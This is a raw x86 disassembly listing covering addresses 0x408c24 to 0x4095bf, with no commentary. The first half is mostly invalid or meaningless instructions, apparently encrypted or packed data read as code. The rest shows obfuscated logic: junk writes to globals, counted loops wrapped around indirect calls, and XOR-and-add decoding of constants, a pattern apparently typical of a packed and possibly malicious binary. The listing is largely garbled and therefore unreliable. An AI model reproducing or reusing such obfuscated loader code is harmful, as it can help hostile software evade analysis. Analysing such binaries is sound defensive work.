  408c24:	or     al,0xfb
  408c26:	mov    ebx,0x81299eb9
  408c2b:	inc    ebp
  408c2c:	aas    
  408c2d:	or     al,0x2a
  408c2f:	js     0x408c35
  408c31:	pop    esi
  408c32:	push   edi
  408c33:	mov    WORD PTR [ecx],gs
  408c35:	(bad)  
  408c36:	push   ecx
  408c37:	lds    esp,FWORD PTR ss:[edx-0x3f291467]
  408c3e:	sbb    BYTE PTR [esi+ebp*1-0x27],cl
  408c42:	inc    ebp
  408c43:	mov    edi,0xb8afb502
  408c48:	mov    ebx,0xa63ae688
  408c4d:	adc    eax,0xc3a7dfd9
  408c52:	gs retf 
  408c54:	xor    ah,BYTE PTR [ecx]
  408c56:	xor    al,0x5d
  408c58:	aas    
  408c59:	shl    BYTE PTR [esi-0xe],cl
  408c5c:	retf   0x7afb
  408c5f:	mov    esp,0xb175e4
  408c64:	inc    ebx
  408c65:	scas   eax,DWORD PTR es:[edi]
  408c66:	cdq    
  408c67:	fcom   QWORD PTR [ebx+ebx*8-0x2c]
  408c6b:	jle    0x408c5d
  408c6d:	(bad)  [edi+0x3e]
  408c70:	call   0x2e9a3a6e
  408c75:	aaa    
  408c76:	mov    al,ds:0x271be31c
  408c7b:	xchg   DWORD PTR [edx-0x42],esi
  408c7e:	inc    ecx
  408c7f:	mov    ah,0xaa
  408c81:	dec    edx
  408c82:	(bad)  
  408c83:	mov    BYTE PTR [eax+0x34b84085],bl
  408c89:	mov    edi,0x83360a0d
  408c8e:	push   ebx
  408c8f:	inc    esi
  408c90:	fdivp  st(4),st
  408c92:	int3   
  408c93:	push   ebx
  408c94:	sub    BYTE PTR [esi+esi*2-0x7f2357d0],bl
  408c9b:	mov    eax,ds:0x7df9d333
  408ca0:	aad    0x4f
  408ca2:	pop    ds
  408ca3:	add    dh,cl
  408ca5:	jl     0x408c28
  408ca7:	sbb    eax,0x94dbebf0
  408cac:	dec    edi
  408cad:	and    DWORD PTR [edi+0x67],0x62
  408cb1:	fstp   QWORD PTR [ebx+0x5d669a22]
  408cb7:	daa    
  408cb8:	mov    eax,ds:0x35d9d370
  408cbd:	dec    ecx
  408cbe:	jns    0x408c88
  408cc0:	das    
  408cc1:	sub    BYTE PTR [edx],dh
  408cc3:	jp     0x408ce0
  408cc5:	popa   
  408cc6:	pushw  es
  408cc8:	stos   DWORD PTR es:[edi],eax
  408cc9:	xchg   ecx,eax
  408cca:	into   
  408ccb:	(bad)  
  408ccc:	in     eax,0x49
  408cce:	in     al,dx
  408ccf:	out    dx,al
  408cd0:	sub    al,0x6e
  408cd2:	(bad)  
  408cd4:	xchg   edx,eax
  408cd5:	jl     0x408cc2
  408cd7:	mov    DWORD PTR [edx-0x14],eax
  408cda:	addr16 mov bh,0xd6
  408cdd:	std    
  408cde:	cmc    
  408cdf:	out    0x94,al
  408ce1:	adc    bh,0x27
  408ce4:	mov    bh,0xd7
  408ce6:	es popf 
  408ce8:	leave  
  408ce9:	fmul   st(5),st
  408ceb:	push   0x7d
  408ced:	xchg   edi,eax
  408cee:	das    
  408cef:	clc    
  408cf0:	or     ecx,DWORD PTR [ecx-0x7c]
  408cf3:	test   DWORD PTR [edx+0x73],esi
  408cf6:	pop    ds
  408cf7:	adc    ch,BYTE PTR [eax]
  408cf9:	hlt    
  408cfa:	test   al,0x59
  408cfc:	int    0x2b
  408cfe:	pop    ecx
  408cff:	add    DWORD PTR [edi+0x1d059a5f],esp
  408d05:	stos   DWORD PTR es:[edi],eax
  408d06:	xor    BYTE PTR [edx-0x295257b],ch
  408d0c:	clc    
  408d0d:	mov    al,ds:0xb3102c37
  408d12:	inc    edx
  408d13:	sahf   
  408d14:	jb     0x408d46
  408d16:	fistp  QWORD PTR [eax+edi*8]
  408d19:	rcr    BYTE PTR [ebx],1
  408d1b:	dec    edi
  408d1c:	scas   al,BYTE PTR es:[edi]
  408d1d:	inc    eax
  408d1e:	sar    DWORD PTR [edi],1
  408d20:	sbb    bh,BYTE PTR [ebx+edi*8]
  408d23:	mov    cl,BYTE PTR [esi]
  408d25:	out    0xec,al
  408d27:	mov    cl,0x77
  408d29:	xor    ebx,edi
  408d2b:	jmp    0x92036869
  408d30:	xchg   ecx,eax
  408d31:	push   esp
  408d32:	addr16 invd 
  408d35:	mov    bh,0x44
  408d37:	js     0x408d85
  408d39:	das    
  408d3a:	lea    ecx,[esp+edi*1]
  408d3d:	jecxz  0x408d12
  408d3f:	out    dx,al
  408d40:	xor    ebp,ecx
  408d42:	push   eax
  408d43:	jmp    0xaec7b39c
  408d48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408d49:	je     0x408d22
  408d4b:	sub    eax,0xa3ef901d
  408d50:	dec    ebx
  408d51:	dec    edi
  408d52:	xor    DWORD PTR [edx-0x21],0xffffffc0
  408d56:	dec    ecx
  408d57:	aas    
  408d58:	mov    dh,0xb4
  408d5a:	push   es
  408d5b:	push   DWORD PTR [eax+0x57]
  408d5e:	jl     0x408da5
  408d60:	pushf  
  408d61:	jecxz  0x408d73
  408d63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408d64:	mul    DWORD PTR [ecx+0x9]
  408d67:	or     al,0x91
  408d69:	cs inc ecx
  408d6b:	cld    
  408d6c:	imul   ebp,DWORD PTR [esi],0xd60f818a
  408d72:	sbb    ecx,eax
  408d74:	sub    DWORD PTR [eax+0x50],edx
  408d77:	mov    al,0x3
  408d79:	xlat   BYTE PTR ds:[ebx]
  408d7a:	mov    edi,DWORD PTR [ebp-0x8]
  408d7d:	lea    edx,[edx+edi*1+0x32729b]
  408d84:	mov    DWORD PTR [ebp-0x8],edx
  408d87:	mov    edx,DWORD PTR [ebp-0x20]
  408d8a:	xor    edx,eax
  408d8c:	mov    edi,0xffcd8d65
  408d91:	sub    edi,edx
  408d93:	add    edi,DWORD PTR [ebp-0x10]
  408d96:	mov    edx,DWORD PTR [ebp-0x20]
  408d99:	jmp    0x408f4a
  408d9e:	adc    BYTE PTR [esi],cl
  408da0:	das    
  408da1:	test   eax,0xb790a931
  408da6:	xor    al,0xa9
  408da8:	mov    ch,0xa
  408daa:	stos   DWORD PTR es:[edi],eax
  408dab:	test   DWORD PTR [ebp+edx*1+0x7e7ed1b1],0x7e7e7f8a
  408db6:	test   BYTE PTR [ecx-0x12],ch
  408db9:	xor    bl,ch
  408dbb:	lds    ecx,FWORD PTR [ebx+ebx*4+0x63]
  408dbf:	lds    eax,FWORD PTR [esi-0x2d]
  408dc2:	rol    dl,1
  408dc4:	test   al,0xe3
  408dc6:	test   al,0x76
  408dc8:	push   ss
  408dc9:	outs   dx,BYTE PTR ds:[esi]
  408dca:	xchg   esp,eax
  408dcb:	mov    ds:0xed3c0ffb,al
  408dd0:	add    eax,DWORD PTR [ebx-0x2bddae29]
  408dd6:	iret   
  408dd7:	scas   eax,DWORD PTR es:[edi]
  408dd8:	scas   al,BYTE PTR es:[edi]
  408dd9:	popf   
  408dda:	cmp    eax,0x6e1d0dd3
  408ddf:	dec    esi
  408de0:	inc    ecx
  408de1:	retf   0x21dc
  408de4:	add    BYTE PTR [edi],al
  408de6:	pop    ss
  408de7:	lods   al,BYTE PTR ds:[esi]
  408de8:	test   BYTE PTR [ecx],al
  408dea:	arpl   WORD PTR [ebx],bx
  408dec:	cs xor eax,0xd5092b1f
  408df2:	(bad)
  408df5:	mov    dl,0x40
  408df7:	pop    esi
  408df8:	and    al,0x5f
  408dfa:	jnp    0x408e3d
  408dfc:	add    BYTE PTR [ebx+eax*2-0x3fc5d822],cl
  408e03:	add    al,0xba
  408e05:	xchg   esi,eax
  408e06:	in     eax,dx
  408e07:	scas   eax,DWORD PTR es:[edi]
  408e08:	sbb    ebx,DWORD PTR [edx+eax*8+0x7e]
  408e0c:	mov    esp,DWORD PTR [edi]
  408e0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408e0f:	xor    BYTE PTR [edi-0x2b],dl
  408e12:	sub    edx,DWORD PTR [edx]
  408e14:	mov    ebp,0x1fe15c2c
  408e19:	mov    ecx,0x73c31ac7
  408e1e:	ja     0x408e42
  408e20:	xor    BYTE PTR [ecx-0x1d],bh
  408e23:	inc    eax
  408e24:	cld    
  408e25:	cmp    al,0x4
  408e27:	jns    0x408e9e
  408e29:	cli    
  408e2a:	pop    eax
  408e2b:	xchg   esp,eax
  408e2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408e2d:	inc    esp
  408e2e:	cmc    
  408e2f:	cmp    DWORD PTR [ebx-0x295c0f9],0xcce4cf6d
  408e39:	xchg   esi,eax
  408e3a:	xor    dh,BYTE PTR [edi+eiz*2-0x37af987a]
  408e41:	fnsave [ebp-0x3ab33fd]
  408e47:	loope  0x408e21
  408e49:	and    esi,DWORD PTR [ebp+0x3f]
  408e4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408e4d:	inc    ebp
  408e4e:	push   eax
  408e4f:	outs   dx,DWORD PTR ds:[esi]
  408e50:	jl     0x408e0b
  408e52:	xor    ebx,DWORD PTR [esi+esi*4+0xf]
  408e56:	iret   
  408e57:	ss pop eax
  408e59:	xor    eax,0xd6df8d3f
  408e5e:	jle    0x408ec8
  408e60:	push   edx
  408e61:	jno    0x408df1
  408e63:	push   ebp
  408e64:	or     dl,BYTE PTR [eax-0x7f]
  408e67:	mov    ecx,0x9d8172a6
  408e6c:	test   al,0x35
  408e6e:	dec    esi
  408e6f:	jnp    0x408eef
  408e71:	jmp    0x408e86
  408e73:	xchg   esp,eax
  408e74:	out    0x0,eax
  408e76:	and    DWORD PTR [ebx],ebp
  408e78:	pop    ebp
  408e79:	fwait
  408e7a:	aad    0x86
  408e7c:	adc    cl,BYTE PTR [esp+ecx*4-0x39]
  408e80:	pop    edi
  408e81:	les    esi,FWORD PTR [ebp+0x17]
  408e84:	sbb    bh,BYTE PTR [esi-0x4b]
  408e87:	push   ds
  408e88:	adc    ebp,esp
  408e8a:	cdq    
  408e8b:	fisubr WORD PTR [eax+0x59]
  408e8e:	out    0xfc,eax
  408e90:	test   BYTE PTR ds:0xea167f76,dl
  408e96:	pop    ds
  408e97:	or     DWORD PTR [esi+0x7a9833c5],edi
  408e9d:	in     al,0xcd
  408e9f:	stc    
  408ea0:	inc    esp
  408ea1:	out    0x7,eax
  408ea3:	jb     0x408e58
  408ea5:	push   ebp
  408ea6:	(bad)  
  408ea7:	sti    
  408ea8:	add    dh,BYTE PTR [eax]
  408eaa:	inc    edx
  408eab:	xchg   ecx,eax
  408eac:	retf   0xf748
  408eaf:	nop
  408eb0:	aas    
  408eb1:	hlt    
  408eb2:	mov    ebx,0xd7fae3b1
  408eb7:	xchg   esi,eax
  408eb8:	and    al,0xdc
  408eba:	dec    esp
  408ebb:	jne    0x408f23
  408ebd:	xchg   BYTE PTR [ecx+0x7d],al
  408ec0:	imul   ecx,DWORD PTR [eax-0x19],0xffffff9f
  408ec4:	(bad)  
  408ec5:	and    esp,edi
  408ec7:	in     al,0x83
  408ec9:	mov    ecx,DWORD PTR [edi+ebp*8+0x23]
  408ecd:	cmp    eax,0xbaf74f0
  408ed2:	sbb    al,0x12
  408ed4:	mov    ah,BYTE PTR [edi]
  408ed6:	and    eax,0x1d6d0fc7
  408edb:	loopne 0x408e7d
  408edd:	mov    BYTE PTR [ebx],cl
  408edf:	xor    BYTE PTR [edx-0x2f1bb691],0xa3
  408ee6:	or     eax,0x53e84ca
  408eeb:	xchg   ecx,eax
  408eec:	imul   ecx,edx,0x79c8284d
  408ef2:	imul   edi,DWORD PTR [edx],0x5
  408ef5:	or     al,0x56
  408ef7:	or     ah,BYTE PTR [ebx-0x20]
  408efa:	and    al,0x62
  408efc:	scas   al,BYTE PTR es:[edi]
  408efd:	mov    ah,0xcc
  408eff:	pop    esi
  408f00:	jmp    0xd45ef81e
  408f05:	and    dh,BYTE PTR [edi+edi*8]
  408f08:	or     al,0x2b
  408f0a:	push   cs
  408f0b:	xchg   ebp,eax
  408f0c:	sub    eax,0x8273eba5
  408f11:	mov    esp,0xf3342800
  408f16:	shl    DWORD PTR [eax+esi*8+0x18],cl
  408f1a:	xchg   esi,eax
  408f1b:	imul   edi,DWORD PTR [ecx-0x1a8b68c8],0x5f6dcd1
  408f25:	mov    DWORD PTR [ebx+0x200b0e97],edx
  408f2b:	sahf   
  408f2c:	into   
  408f2d:	je     0x408f7e
  408f2f:	lea    esp,[ecx+0x497a0250]
  408f35:	std    
  408f36:	sub    eax,0xb8578148
  408f3b:	scas   eax,DWORD PTR es:[edi]
  408f3c:	jg     0x408efe
  408f3e:	sbb    ecx,DWORD PTR [edi+ecx*8-0x75cde0f]
  408f45:	in     eax,0x3f
  408f47:	cmp    al,0xfd
  408f49:	and    BYTE PTR [ebx-0x2fcc07a3],cl
  408f4f:	jmp    0x409100
  408f54:	or     al,0x6
  408f56:	addr16 into 
  408f58:	jne    0x408fc9
  408f5a:	mov    ch,0xc4
  408f5c:	mov    dl,0x4d
  408f5e:	(bad)  
  408f60:	dec    esi
  408f61:	dec    edi
  408f62:	jne    0x408f20
  408f64:	int    0xdf
  408f66:	jle    0x408fe6
  408f68:	mov    bh,BYTE PTR [edi+0x7e]
  408f6b:	jle    0x408f0f
  408f6d:	mov    eax,ds:0xa1b13f4e
  408f72:	outs   dx,DWORD PTR ds:[esi]
  408f73:	dec    ebx
  408f74:	sbb    al,0x94
  408f76:	sbb    al,0xa4
  408f78:	adc    eax,DWORD PTR [ecx-0xe]
  408f7b:	pushf  
  408f7c:	mov    edx,0x96e272be
  408f81:	sub    bl,al
  408f83:	rcl    al,0xdb
  408f86:	call   0xf7ea77c6
  408f8b:	lods   eax,DWORD PTR ds:[esi]
  408f8c:	jns    0x408f25
  408f8e:	sub    BYTE PTR [esp+eax*4+0x53],0xd8
  408f93:	pop    ds
  408f94:	push   cs
  408f95:	jnp    0x408f2c
  408f97:	pop    ds
  408f98:	mov    ebp,0xfeb14315
  408f9d:	pop    es
  408f9e:	xor    eax,0x800abcf6
  408fa3:	mov    DWORD PTR [ecx],edi
  408fa5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408fa6:	mul    DWORD PTR [esi+0x11]
  408fa9:	cdq    
  408faa:	mov    dh,0x8a
  408fac:	or     eax,0x3b7987b0
  408fb1:	inc    esi
  408fb2:	daa    
  408fb3:	cmc    
  408fb4:	pmulhw mm5,mm6
  408fb7:	outs   dx,BYTE PTR ds:[esi]
  408fb8:	xchg   edx,eax
  408fb9:	push   esi
  408fba:	and    ah,BYTE PTR ds:0xd55ffa5d
  408fc0:	xchg   DWORD PTR [ebp+0x4bd15965],esi
  408fc6:	addr16 int 0x54
  408fc9:	or     eax,0xd0244eb
  408fce:	outs   dx,DWORD PTR ds:[esi]
  408fcf:	arpl   dx,cx
  408fd1:	js     0x409029
  408fd3:	push   ecx
  408fd4:	(bad)  
  408fd5:	fsubr  QWORD PTR [edi-0x6d]
  408fd8:	pop    esi
  408fd9:	and    eax,0x6eccfab4
  408fde:	nop
  408fdf:	outs   dx,DWORD PTR ds:[esi]
  408fe0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408fe1:	nop
  408fe2:	stc    
  408fe3:	adc    cl,cl
  408fe5:	mov    ah,bl
  408fe7:	sub    ecx,DWORD PTR [esi-0x2d]
  408fea:	ins    BYTE PTR es:[edi],dx
  408feb:	leave  
  408fec:	add    cl,BYTE PTR [eax+0x66]
  408fef:	loop   0x408fa4
  408ff1:	je     0x408fa3
  408ff3:	ss fxtract 
  408ff6:	push   0x10e8c233
  408ffb:	out    dx,eax
  408ffc:	int    0x37
  408ffe:	push   eax
  408fff:	sub    bl,BYTE PTR [edx-0x1e8e8b20]
  409005:	jb     0x409017
  409007:	pop    esp
  409008:	inc    esp
  409009:	push   es
  40900a:	mov    ebp,0xb3bf9a4f
  40900f:	mov    ah,0x2c
  409011:	cmp    ecx,0x38e15d01
  409017:	xchg   esp,eax
  409018:	in     al,0x46
  40901a:	mov    eax,0x3041fd4a
  40901f:	push   esi
  409020:	inc    edi
  409021:	imul   bx,WORD PTR [esi-0x7b5a68fd],0xd
  409029:	sbb    DWORD PTR [eax+ebx*1-0x388d60d4],esp
  409030:	dec    esp
  409031:	ret    
  409032:	outs   dx,DWORD PTR ds:[esi]
  409033:	push   ebx
  409034:	mov    cl,0x4a
  409036:	clc    
  409037:	(bad)  
  409038:	sub    eax,0xbee331e0
  40903d:	dec    esi
  40903e:	pop    edi
  40903f:	ja     0x409041
  409041:	and    DWORD PTR [ebp-0x4fc803bd],ebx
  409047:	fwait
  409048:	aad    0xd6
  40904a:	push   0xffffff97
  40904c:	fcomp  QWORD PTR [esi+esi*4+0x525ebcc0]
  409053:	packuswb mm6,QWORD PTR [eax]
  409056:	push   ss
  409057:	or     eax,0xfe052ec6
  40905c:	pop    eax
  40905d:	push   0x13
  40905f:	adc    BYTE PTR [eax-0x14],ch
  409062:	div    DWORD PTR [ebx]
  409064:	jno    0x4090b4
  409066:	(bad)  
  409068:	cmp    al,0x3d
  40906a:	repz jle 0x40909f
  40906d:	pushf  
  40906e:	mov    ebx,0x447ef13b
  409073:	loopne 0x40909e
  409075:	popf   
  409076:	test   eax,0xff300d50
  40907b:	xchg   DWORD PTR [edi+0x366c15f2],ecx
  409081:	sub    esi,DWORD PTR [edi]
  409083:	sbb    eax,0xf941a575
  409088:	retf   
  409089:	jge    0x409077
  40908b:	or     esp,DWORD PTR [edi]
  40908d:	aaa    
  40908e:	lods   eax,DWORD PTR ds:[esi]
  40908f:	mov    edx,0x9acb2da
  409094:	es jecxz 0x4090e4
  409097:	dec    eax
  409098:	fisttp QWORD PTR [eax-0x6a]
  40909b:	ins    BYTE PTR es:[edi],dx
  40909c:	test   eax,0xdf689fec
  4090a1:	sub    DWORD PTR [edx],ecx
  4090a3:	cli    
  4090a4:	mov    WORD PTR [ebx],ss
  4090a6:	bound  edi,QWORD PTR [ebp-0xf7b1b9d]
  4090ac:	push   esi
  4090ad:	jg     0x4090b4
  4090af:	pushf  
  4090b0:	in     eax,dx
  4090b1:	mov    bl,0xca
  4090b3:	mov    al,ds:0xd60128c4
  4090b8:	adc    eax,0xf90ecaf8
  4090bd:	and    al,0xde
  4090bf:	push   esi
  4090c0:	loope  0x40913d
  4090c2:	pop    es
  4090c3:	in     eax,dx
  4090c4:	sti    
  4090c5:	jmp    0x409146
  4090c7:	mov    esi,0x14abb486
  4090cc:	out    dx,al
  4090cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4090ce:	mov    WORD PTR [edx],es
  4090d0:	pop    ebp
  4090d1:	jbe    0x409065
  4090d3:	scas   eax,DWORD PTR es:[edi]
  4090d4:	pop    esi
  4090d5:	shl    ch,cl
  4090d7:	inc    ecx
  4090d8:	sbb    edi,ebp
  4090da:	xor    dh,BYTE PTR [edx+esi*4-0x3a]
  4090de:	test   esi,esp
  4090e0:	pop    edi
  4090e1:	dec    esi
  4090e2:	mov    ah,0x8d
  4090e4:	rcr    DWORD PTR ds:0x4c811587,0xf3
  4090eb:	stos   BYTE PTR es:[edi],al
  4090ec:	push   ebx
  4090ed:	iret   
  4090ee:	(bad)  
  4090ef:	cmp    ch,dh
  4090f1:	xor    BYTE PTR [ebx+0x7f],dl
  4090f4:	(bad)  
  4090f5:	in     eax,dx
  4090f6:	int    0x14
  4090f8:	jmp    0x7721:0x826cbb72
  4090ff:	mov    ah,0x3
  409101:	ror    DWORD PTR [edi],1
  409103:	scas   eax,DWORD PTR es:[edi]
  409104:	sar    DWORD PTR [ebx],cl
  409106:	xlat   BYTE PTR ds:[ebx]
  409107:	jbe    0x407629
  40910d:	pop    ebx
  40910e:	pop    edi
  40910f:	leave  
  409110:	ret    0x8
  409113:	push   ebp
  409114:	mov    ebp,esp
  409116:	sub    esp,0x70
  409119:	call   DWORD PTR ds:0x42ea37
  40911f:	and    DWORD PTR ds:0x4304db,0x43043d
  409129:	xor    ecx,ecx
  40912b:	mov    DWORD PTR ds:0x42eddb,0x7bf5
  409135:	cmp    eax,0x86576545
  40913a:	mov    DWORD PTR ds:0x4304e3,0x7971
  409144:	jne    0x409304
  40914a:	cmp    ecx,0x9879
  409150:	mov    DWORD PTR ds:0x42e7d8,0x1505
  40915a:	jne    0x409304
  409160:	push   0x78776563
  409165:	call   DWORD PTR ds:0x42ea77
  40916b:	sbb    DWORD PTR ds:0x430441,0x430471
  409175:	push   0x8678976
  40917a:	or     DWORD PTR ds:0x42edcb,0x624a
  409184:	call   DWORD PTR ds:0x42ea3f
  40918a:	adc    DWORD PTR ds:0x42e7c0,0x43045d
  409194:	test   eax,eax
  409196:	je     0x4091ca
  40919c:	mov    DWORD PTR ds:0x430451,0x7d40
  4091a6:	push   0x87678768
  4091ab:	xor    DWORD PTR ds:0x430435,0x35ac
  4091b5:	push   0x86787676
  4091ba:	or     DWORD PTR ds:0x43046d,0x42e7d4
  4091c4:	call   DWORD PTR ds:0x42eae3
  4091ca:	push   ebx
  4091cb:	mov    ebx,0xf89c8531
  4091d0:	mov    ecx,DWORD PTR ds:0x42e7c8
  4091d6:	and    DWORD PTR ds:0x430459,ecx
  4091dc:	mov    DWORD PTR [ebp-0x8],ebx
  4091df:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  4091e6:	adc    DWORD PTR ds:0x430439,edi
  4091ec:	lea    eax,[ebp-0x18]
  4091ef:	mov    DWORD PTR ds:0x42eddb,0x1a
  4091f9:	cmp    DWORD PTR ds:0x42eddb,0x0
  409200:	je     0x409235
  409206:	cmp    DWORD PTR ds:0x42eddb,0x25
  40920d:	jne    0x409219
  409213:	call   DWORD PTR ds:0x42e9e3
  409219:	mov    ecx,DWORD PTR ds:0x42eddb
  40921f:	dec    ecx
  409220:	mov    DWORD PTR ds:0x42eddb,ecx
  409226:	jmp    0x4091f9
  40922b:	sub    DWORD PTR ds:0x42ede3,0x62aa
  409235:	mov    DWORD PTR [ebp-0x14],eax
  409238:	lea    eax,[ebp-0x1c]
  40923b:	mov    DWORD PTR [ebp-0xc],eax
  40923e:	mov    eax,ds:0x42eddf
  409243:	sbb    eax,DWORD PTR ds:0x42eddb
  409249:	mov    ds:0x42eddf,eax
  40924e:	mov    eax,ds:0x4121a8
  409253:	mov    eax,DWORD PTR [eax+0x1c8]
  409259:	mov    eax,DWORD PTR [eax]
  40925b:	mov    ecx,DWORD PTR ds:0x42eddb
  409261:	and    DWORD PTR ds:0x42e7bc,ecx
  409267:	mov    ecx,DWORD PTR [ebp-0xc]
  40926a:	or     DWORD PTR ds:0x430455,0x4304d7
  409274:	push   esi
  409275:	add    DWORD PTR ds:0x42e7cc,edx
  40927b:	mov    esi,0x7510854
  409280:	adc    DWORD PTR ds:0x430455,0x7ea6
  40928a:	xor    eax,esi
  40928c:	or     DWORD PTR ds:0x42edcb,0x4304e7
  409296:	push   edi
  409297:	neg    edi
  409299:	mov    edi,0x32729b
  40929e:	sub    DWORD PTR ds:0x42edcb,0x2aac
  4092a8:	add    eax,edi
  4092aa:	mov    DWORD PTR ds:0x430449,0x4315
  4092b4:	mov    DWORD PTR [ecx],eax
  4092b6:	mov    eax,0x4350
  4092bb:	mov    eax,ds:0x4123c8
  4092c0:	cmp    eax,0x23c13046
  4092c5:	mov    eax,DWORD PTR [ebp-0x4]
  4092c8:	mov    DWORD PTR ds:0x430459,0x50bd
  4092d2:	je     0x409332
  4092d8:	and    DWORD PTR ds:0x42ede3,edx
  4092de:	mov    ecx,DWORD PTR [ebp-0x8]
  4092e1:	add    DWORD PTR ds:0x42e7c8,0x3ec0
  4092eb:	xor    eax,esi
  4092ed:	add    eax,edi
  4092ef:	or     DWORD PTR ds:0x430435,0x6771
  4092f9:	imul   eax,ecx
  4092fc:	mov    DWORD PTR [ebp-0x8],eax
  4092ff:	jmp    0x409535
  409304:	push   0x4122bc
  409309:	call   DWORD PTR ds:0x42e9ff
  40930f:	adc    DWORD PTR ds:0x42eddf,0x42e7cc
  409319:	test   eax,eax
  40931b:	je     0x4091ca
  409321:	xor    eax,eax
  409323:	mov    DWORD PTR ds:0x430455,0x3bf5
  40932d:	jmp    0x4098b3
  409332:	xor    eax,esi
  409334:	and    DWORD PTR ds:0x430451,0x0
  40933e:	jmp    0x409352
  409343:	xor    ecx,ecx
  409345:	or     ecx,DWORD PTR ds:0x430451
  40934b:	inc    ecx
  40934c:	mov    DWORD PTR ds:0x430451,ecx
  409352:	cmp    DWORD PTR ds:0x430451,0x1d
  409359:	jae    0x40939a
  40935f:	cmp    DWORD PTR ds:0x430451,0xc
  409366:	jne    0x409375
  40936c:	push   DWORD PTR [ebp-0x18]
  40936f:	call   DWORD PTR ds:0x42e9e7
  409375:	cmp    DWORD PTR ds:0x430451,0xb
  40937c:	jne    0x40938f
  409382:	mov    ecx,DWORD PTR ds:0x430451
  409388:	inc    ecx
  409389:	mov    DWORD PTR ds:0x430451,ecx
  40938f:	jmp    0x409343
  409394:	or     ecx,DWORD PTR ds:0x42edcb
  40939a:	add    eax,edi
  40939c:	mov    ecx,DWORD PTR ds:0x42e967
  4093a2:	mov    ecx,DWORD PTR [ecx]
  4093a4:	adc    DWORD PTR ds:0x4304d3,ecx
  4093aa:	mov    ds:0x4122b8,eax
  4093af:	mov    DWORD PTR ds:0x4304eb,0x17
  4093b9:	cmp    DWORD PTR ds:0x4304eb,0x0
  4093c0:	je     0x409450
  4093c6:	cmp    DWORD PTR ds:0x4304eb,0x3
  4093cd:	jne    0x4093df
  4093d3:	push   DWORD PTR [ebp-0x1c]
  4093d6:	push   DWORD PTR [ebp-0x24]
  4093d9:	call   DWORD PTR ds:0x42e9eb
  4093df:	cmp    DWORD PTR ds:0x4304eb,0x4
  4093e6:	jne    0x4093f9
  4093ec:	mov    ecx,DWORD PTR ds:0x4304eb
  4093f2:	dec    ecx
  4093f3:	mov    DWORD PTR ds:0x4304eb,ecx
  4093f9:	mov    ecx,DWORD PTR ds:0x4304eb
  4093ff:	dec    ecx
  409400:	mov    DWORD PTR ds:0x4304eb,ecx
  409406:	jmp    0x4093b9
  40940b:	mov    DWORD PTR ds:0x4304df,0x10
  409415:	cmp    DWORD PTR ds:0x4304df,0x0
  40941c:	je     0x409450
  409422:	cmp    DWORD PTR ds:0x4304df,0x1a
  409429:	jne    0x409438
  40942f:	push   DWORD PTR [ebp-0x10]
  409432:	call   DWORD PTR ds:0x42e9ef
  409438:	mov    ecx,DWORD PTR ds:0x4304df
  40943e:	dec    ecx
  40943f:	mov    DWORD PTR ds:0x4304df,ecx
  409445:	jmp    0x409415
  40944a:	not    DWORD PTR ds:0x430461
  409450:	mov    eax,DWORD PTR [ebp-0x8]
  409453:	xor    eax,esi
  409455:	add    eax,edi
  409457:	mov    DWORD PTR ds:0x430469,0x16
  409461:	cmp    DWORD PTR ds:0x430469,0x0
  409468:	je     0x409493
  40946e:	cmp    DWORD PTR ds:0x430469,0x25
  409475:	jne    0x409481
  40947b:	call   DWORD PTR ds:0x42e9f3
  409481:	mov    ecx,DWORD PTR ds:0x430469
  409487:	dec    ecx
  409488:	mov    DWORD PTR ds:0x430469,ecx
  40948e:	jmp    0x409461
  409493:	mov    ds:0x4123c8,eax
  409498:	mov    eax,DWORD PTR [ebp-0x4]
  40949b:	and    DWORD PTR ds:0x42edcf,0x0
  4094a5:	jmp    0x4094b7
  4094aa:	mov    ecx,DWORD PTR ds:0x42edcf
  4094b0:	inc    ecx
  4094b1:	mov    DWORD PTR ds:0x42edcf,ecx
  4094b7:	cmp    DWORD PTR ds:0x42edcf,0x13
  4094be:	jae    0x4094e6
  4094c4:	cmp    DWORD PTR ds:0x42edcf,0x21
  4094cb:	jne    0x4094e1
  4094d1:	push   0x42e8fb
  4094d6:	push   0x42e8a5
  4094db:	call   DWORD PTR ds:0x42ec2b
  4094e1:	jmp    0x4094aa
  4094e6:	mov    ecx,DWORD PTR ds:0x4122b8
  4094ec:	xor    eax,esi
  4094ee:	add    DWORD PTR ds:0x430451,0x1a56
  4094f8:	add    eax,edi
  4094fa:	mov    DWORD PTR ds:0x4304eb,0x68f3
  409504:	cmp    ecx,eax
  409506:	mov    DWORD PTR ds:0x42ede3,0x3c82
  409510:	jne    0x409535
  409516:	sbb    DWORD PTR ds:0x430469,0x89e
  409520:	push   DWORD PTR [ebp-0x4]
  409523:	push   DWORD PTR [ebp-0x8]
  409526:	sbb    DWORD PTR ds:0x4304e3,0x430471
  409530:	call   0x4098b7
  409535:	mov    DWORD PTR ds:0x430439,0x1e
  40953f:	cmp    DWORD PTR ds:0x430439,0x0
  409546:	je     0x40958c
  40954c:	cmp    DWORD PTR ds:0x430439,0x25
  409553:	jne    0x40956c
  409559:	push   0x7778
  40955e:	push   DWORD PTR [ebp-0x14]
  409561:	push   0x42e7dc
  409566:	call   DWORD PTR ds:0x42e9f7
  40956c:	mov    eax,ds:0x430439
  409571:	dec    eax
  409572:	mov    ds:0x430439,eax
  409577:	jmp    0x40953f
  40957c:	mov    edx,DWORD PTR ds:0x430489
  409582:	mov    eax,ds:0x430513
  409587:	sub    edx,eax
  409589:	add    edx,DWORD PTR [edx+eax*1]
  40958c:	mov    eax,ds:0x4121a8
  409591:	mov    eax,DWORD PTR [eax+0x18c]
  409597:	xor    DWORD PTR ds:0x4304cf,0x75b9
  4095a1:	mov    eax,DWORD PTR [eax]
  4095a3:	sub    edx,0xc40
  4095a9:	mov    DWORD PTR [ebp-0x20],eax
  4095ac:	mov    eax,0xf89c853d
  4095b1:	xor    DWORD PTR ds:0x42e7d8,ecx
  4095b7:	mov    DWORD PTR [ebp-0x24],eax
  4095ba:	mov    DWORD PTR [ebp-0x24],eax
  4095bd:	add    edx,edx
  4095bf:	mov    DWORD PTR [ebp-0x24],eax
